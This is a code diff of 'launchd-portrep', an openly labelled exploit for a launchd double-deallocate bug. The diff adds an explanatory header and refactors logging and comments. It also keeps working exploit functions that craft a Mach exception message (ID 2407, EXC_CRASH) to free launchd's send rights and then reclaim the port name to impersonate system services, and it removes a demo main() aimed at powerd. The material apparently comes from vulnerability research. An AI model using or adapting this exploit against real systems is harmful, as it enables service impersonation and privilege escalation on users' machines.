@@ -1,38 +1,111 @@
+/*
+ * launchd-portrep
+ * Brandon Azad
+ *
+ *
+ * launchd-portrep
+ * ================================================================================================
+ *
+ *  launchd-portrep is an exploit for a port replacement vulnerability in launchd. By sending a
+ *  crafted Mach message to the bootstrap port, launchd can be coerced into deallocating its send
+ *  right for any Mach port to which the attacker also has a send right. This allows the attacker
+ *  to impersonate any launchd service it can look up to the rest of the system.
+ *
+ *
+ * The vulnerability
+ * ------------------------------------------------------------------------------------------------
+ *
+ *  Launchd multiplexes multiple different Mach message handlers over its main port, including a
+ *  MIG handler for exception messages. If a process sends a mach_exception_raise,
+ *  mach_exception_raise_state, or mach_exception_raise_state_identity message to its bootstrap
+ *  port, launchd will receive and process that message as a host-level exception.
+ *
+ *  Unfortunately, launchd's handling of these messages is buggy. If the exception type is 10
+ *  (EXC_CRASH), then launchd will deallocate the thread and task ports sent in the message and
+ *  then return 5 (KERN_FAILURE) from the service routine, causing the MIG system to deallocate the
+ *  thread and task ports again. (The assumption is that if a service routine returns success, then
+ *  the service routine has taken ownership of all resources in the Mach message, while if the
+ *  service routine returns an error, then the service routine has taken ownership of none of the
+ *  resources.)
+ *
+ *  This can be exploited to free launchd's send right to any Mach port to which the attacking
+ *  process also has a send right. In particular, if the attacker can look up a system service
+ *  using launchd, then it can free launchd's send right to that service and then impersonate it to
+ *  the rest of the system. After that there are many different routes to gain system privileges.
+ *
+ */
+
+#include "launchd-portrep.h"
+
+#include <assert.h>
 #include <bootstrap.h>
-#include <mach/mach.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 
-#include <assert.h>
+// ---- Logging -----------------------------------------------------------------------------------
 
-#define ERROR(fmt, ...)			printf("Error: "fmt"\n", ##__VA_ARGS__)
-#define WARNING(fmt, ...)		printf("Warning: "fmt"\n", ##__VA_ARGS__)
-#define DEBUG_TRACE(level, fmt, ...)	printf("Debug: "fmt"\n", ##__VA_ARGS__)
+#define DEBUG_LEVEL(level)	(DEBUG && level <= DEBUG)
 
-/*
- * launchd_release_send_right_twice
- *
- * Description:
- * 	Cause launchd to release the specified send right twice. This should be enough to
- * 	completely release launchd's send right for most of the Mach services it vends.
- *
- * Parameters:
- * 	send_right			The send right to force launchd to release.
- *
- * Returns:
- * 	Returns true on success.
- *
- * Notes:
- * 	This function cannot detect whether the send right was actually released; it will continue
- * 	to return true even when this vulnerability is patched.
- */
+#if DEBUG
+#define DEBUG_TRACE(level, fmt, ...)						\
+	do {									\
+		if (DEBUG_LEVEL(level)) {					\
+			log_internal('D', fmt, ##__VA_ARGS__);			\
+		}								\
+	} while (0)
+#else
+#define DEBUG_TRACE(level, fmt, ...)	do {} while (0)
+#endif
+#define INFO(fmt, ...)			log_internal('I', fmt, ##__VA_ARGS__)
+#define WARNING(fmt, ...)		log_internal('W', fmt, ##__VA_ARGS__)
+#define ERROR(fmt, ...)			log_internal('E', fmt, ##__VA_ARGS__)
+
+// A function to call the logging implementation.
+static void
+log_internal(char type, const char *format, ...) {
+	if (launchd_portrep_log != NULL) {
+		va_list ap;
+		va_start(ap, format);
+		launchd_portrep_log(type, format, ap);
+		va_end(ap);
+	}
+}
+
+// The default logging implementation simply prints to stderr.
+static void
+log_to_stderr(char type, const char *format, va_list ap) {
+	char *message = NULL;
+	vasprintf(&message, format, ap);
+	assert(message != NULL);
+	const char *logtype   = "";
+	const char *separator = ": ";
+	switch (type) {
+		case 'D': logtype = "Debug";   break;
+		case 'I': logtype = "Info";    break;
+		case 'W': logtype = "Warning"; break;
+		case 'E': logtype = "Error";   break;
+		default:  separator = "";
+	}
+	fprintf(stderr, "%s%s%s\n", logtype, separator, message);
+	free(message);
+}
+
+void (*launchd_portrep_log)(char type, const char *format, va_list ap) = log_to_stderr;
+
+// ---- Freeing a Mach send right in launchd ------------------------------------------------------
+
 bool
 launchd_release_send_right_twice(mach_port_t send_right) {
-	mach_port_t reply_port = mig_get_reply_port();
-	const uint32_t deallocate_ports_exception = 10;
+	// We will send a Mach message to launchd that triggers the
+	// mach_exception_raise_state_identity MIG handler in launchd. This MIG handler, which is
+	// exposed over the bootstrap port, improperly calls mach_port_deallocate() on the supplied
+	// task and thread ports, even when returning an error condition due to supplying exception
+	// 10. This leads to a double-deallocate of those ports.
+	const mach_port_t reply_port = mig_get_reply_port();
+	const uint32_t deallocate_ports_exception = 10; // EXC_CRASH
 	const mach_msg_id_t mach_exception_raise_state_identity_id = 2407;
-	const kern_return_t RetCode_success = 5;
+	const kern_return_t RetCode_success = 5; // KERN_FAILURE
 	const int32_t flavor = 6; // ARM_THREAD_STATE64
 	const uint32_t stateCnt = 144;
 
@@ -122,6 +195,8 @@ launchd_release_send_right_twice(mach_port_t send_right) {
 	return true;
 }
 
+// ---- Replacing a service port in launchd -------------------------------------------------------
+
 // Look up the specified service in launchd, returning the service port.
 static mach_port_t
 launchd_look_up(const char *service) {
@@ -202,25 +277,15 @@ reverse_mach_port_freelist_send_ports(mach_port_t service, mach_port_t *ports, s
 	return true;
 }
 
-/*
- * launchd_replace_service_port
- *
- * Description:
- * 	Replace launchd's send right to the specified service with a send right to a port we own.
- * 	We must be able to look up the service.
- *
- * Parameters:
- * 	service_name			The name of the service we want to replace.
- * 	real_service_port		On return, a send right to the real service port.
- * 	replacement_service_port	On return, a send/receive right for a newly allocated Mach
- * 					port that launchd will vend as the service port.
- *
- * Returns:
- * 	Returns true on success.
- */
 bool
 launchd_replace_service_port(const char *service_name,
 		mach_port_t *real_service_port, mach_port_t *replacement_service_port) {
+	// Using the double-deallocate primitive above, we can cause launchd to deallocate its send
+	// right to one of the services that it vends (so long as we are allowed to look up that
+	// service). Then, by registering a large number of services, we can eventually get that
+	// Mach port name to be reused for one of our services. From that point on, when other
+	// programs look up the target service in launchd, launchd will send a send right to our
+	// fake service rather than the real one.
 	const size_t MAX_TRIES  = 2000;
 	const size_t PORT_COUNT = 400;
 	// Look up the service.
@@ -291,12 +356,10 @@ launchd_replace_service_port(const char *service_name,
 			}
 		}
 #if DEBUG
-		// Check if we got something else entirely.
+		// Check if we got something else entirely. This used to happen regularly, but now
+		// that we're pushing the freed port down the freelist it's not as common.
 		if (new_service != MACH_PORT_DEAD && replacement_port == MACH_PORT_NULL) {
-			DEBUG_TRACE(1, "Got something unexpected! Investigate!");
-			DEBUG_TRACE(1, "pid = %u, port = %x\n", getpid(), new_service);
-			DEBUG_TRACE(1, "Run lsmp now!");
-			sleep(1000); // TODO
+			DEBUG_TRACE(1, "%s: Got something unexpected! %x", __func__, new_service);
 		}
 #endif
 deallocate_ports:
@@ -327,16 +390,4 @@ deallocate_ports:
 	*real_service_port        = real_service;
 	*replacement_service_port = replacement_port;
 	return true;
-}
-
-int main() {
-	// Replace launchd's send right to powerd with a fake service port.
-	const char *POWERD_SERVICE_NAME = "com.apple.PowerManagement.control";
-	mach_port_t real_powerd, fake_powerd;
-	bool ok = launchd_replace_service_port(POWERD_SERVICE_NAME, &real_powerd, &fake_powerd);
-	if (!ok) {
-		return 1;
-	}
-	printf("real_powerd = %x, fake_powerd = %x\n", real_powerd, fake_powerd);
-	return 0;
 }
